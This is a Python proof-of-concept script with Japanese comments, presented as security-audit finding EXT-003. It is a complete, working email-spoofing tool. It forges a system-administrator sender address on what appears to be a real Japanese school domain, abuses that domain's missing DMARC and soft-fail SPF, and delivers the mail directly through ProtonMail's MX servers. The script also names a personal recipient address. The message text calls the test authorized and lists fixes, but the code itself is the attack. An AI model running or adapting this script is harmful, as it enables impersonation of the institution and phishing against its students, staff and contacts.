#!/usr/bin/env python3
"""
EXT-003 PoC: DMARC/SPF不備によるメールスプーフィング実証

対象ドメイン: aichi-te.aichi-c.ed.jp (DMARC: なし, SPF: ~all)
送信先: 監査者自身のメールアドレス (テスト目的)
"""

import json
import smtplib
import socket
import sys
import time
from datetime import datetime, timezone
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- 設定 ---
SPOOFED_FROM = "senkoad@aichi-te.aichi-c.ed.jp"
SPOOFED_FROM_NAME = "システム管理者（学校様用）"
TO_ADDR = "hiro114514@proton.me"
MX_SERVERS = ["mail.protonmail.ch", "mailsec.protonmail.ch"]
SMTP_PORT = 25

def send_spoofed_email():
    """DMARC/SPF不備を利用したスプーフィングメール送信"""

    # メール本文作成
    msg = MIMEMultipart("alternative")
    msg["From"] = f"{SPOOFED_FROM_NAME} <{SPOOFED_FROM}>"
    msg["To"] = TO_ADDR
    msg["Subject"] = "[セキュリティ監査テスト] DMARC/SPF脆弱性デモンストレーション"
    msg["X-Audit-ID"] = "EXT-003"
    msg["X-Audit-Purpose"] = "Security audit demonstration - not malicious"

    body_text = """これは危険性のデモンストレーションです

============================================
セキュリティ監査 EXT-003: メールスプーフィング実証
============================================

このメールは、aichi-te.aichi-c.ed.jp ドメインの
DMARC/SPF設定不備を実証するために送信されました。

送信元アドレス（偽装）: senkoad@aichi-te.aichi-c.ed.jp
実際の送信元: 監査者のテスト環境
目的: DMARC p=none / SPF ~all の脆弱性デモ

脆弱性の詳細:
- aichi-te.aichi-c.ed.jp: DMARCレコードなし, SPF ~all (soft fail)
- aichi-te-ad.jp: DMARC p=none (ruaなし), SPF ~all
- 受信側メールサーバーはスプーフィングメールを拒否しない

推奨対策:
1. DMARCポリシーを p=reject に設定
2. SPFを -all (hard fail) に変更
3. DKIMの導入

============================================
これは許可されたセキュリティ監査の一環です。
悪意のある目的ではありません。
============================================
"""

    body_html = """<html><body>
<h2>これは危険性のデモンストレーションです</h2>
<hr>
<h3>セキュリティ監査 EXT-003: メールスプーフィング実証</h3>
<p>このメールは、<strong>aichi-te.aichi-c.ed.jp</strong> ドメインの
DMARC/SPF設定不備を実証するために送信されました。</p>
<table border="1" cellpadding="5" style="border-collapse:collapse;">
<tr><td>送信元アドレス（偽装）</td><td>senkoad@aichi-te.aichi-c.ed.jp</td></tr>
<tr><td>実際の送信元</td><td>監査者のテスト環境</td></tr>
<tr><td>目的</td><td>DMARC p=none / SPF ~all の脆弱性デモ</td></tr>
</table>
<h4>脆弱性の詳細:</h4>
<ul>
<li>aichi-te.aichi-c.ed.jp: DMARCレコードなし, SPF ~all (soft fail)</li>
<li>aichi-te-ad.jp: DMARC p=none (ruaなし), SPF ~all</li>
<li>受信側メールサーバーはスプーフィングメールを拒否しない</li>
</ul>
<h4>推奨対策:</h4>
<ol>
<li>DMARCポリシーを p=reject に設定</li>
<li>SPFを -all (hard fail) に変更</li>
<li>DKIMの導入</li>
</ol>
<hr>
<p><em>これは許可されたセキュリティ監査の一環です。悪意のある目的ではありません。</em></p>
</body></html>"""

    msg.attach(MIMEText(body_text, "plain", "utf-8"))
    msg.attach(MIMEText(body_html, "html", "utf-8"))

    # SMTP送信
    result = {
        "vulnerability_id": "EXT-003",
        "title": "メールスプーフィング DMARC/SPF不備 PoC",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "spoofed_from": SPOOFED_FROM,
        "to": TO_ADDR,
        "subject": msg["Subject"],
        "mx_servers_tried": [],
        "success": False,
        "smtp_response": None,
        "error": None,
    }

    for mx in MX_SERVERS:
        print(f"[*] MXサーバーに接続中: {mx}:{SMTP_PORT}")
        result["mx_servers_tried"].append(mx)
        try:
            with smtplib.SMTP(mx, SMTP_PORT, timeout=30) as server:
                server.set_debuglevel(1)
                ehlo_resp = server.ehlo(socket.getfqdn())
                print(f"[*] EHLO応答: {ehlo_resp}")

                # STARTTLSが利用可能なら使用
                if server.has_extn("STARTTLS"):
                    print("[*] STARTTLS開始")
                    server.starttls()
                    server.ehlo()

                # 送信
                smtp_result = server.sendmail(
                    SPOOFED_FROM,
                    [TO_ADDR],
                    msg.as_string()
                )

                result["success"] = True
                result["smtp_response"] = f"送信成功 (rejected recipients: {smtp_result})"
                print(f"\n[+] メール送信成功!")
                print(f"    From: {SPOOFED_FROM} (偽装)")
                print(f"    To:   {TO_ADDR}")
                break

        except smtplib.SMTPRecipientsRefused as e:
            result["error"] = f"受信者拒否: {e}"
            print(f"[-] 受信者拒否: {e}")
        except smtplib.SMTPSenderRefused as e:
            result["error"] = f"送信者拒否 (SPFチェック?): {e}"
            print(f"[-] 送信者拒否: {e}")
        except smtplib.SMTPDataError as e:
            result["error"] = f"DATAエラー: {e}"
            print(f"[-] DATAエラー: {e}")
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            result["error"] = f"接続エラー: {e}"
            print(f"[-] 接続エラー ({mx}): {e}")
            continue

    # 結果保存
    output_path = f"outputs/poc/ext003_result_{int(time.time())}.json"
    with open(output_path, "w") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

    print(f"\n{'='*60}")
    print(f"EXT-003 結果: {'成功' if result['success'] else '失敗'}")
    print(f"保存先: {output_path}")
    print(f"{'='*60}")

    return result


if __name__ == "__main__":
    send_spoofed_email()
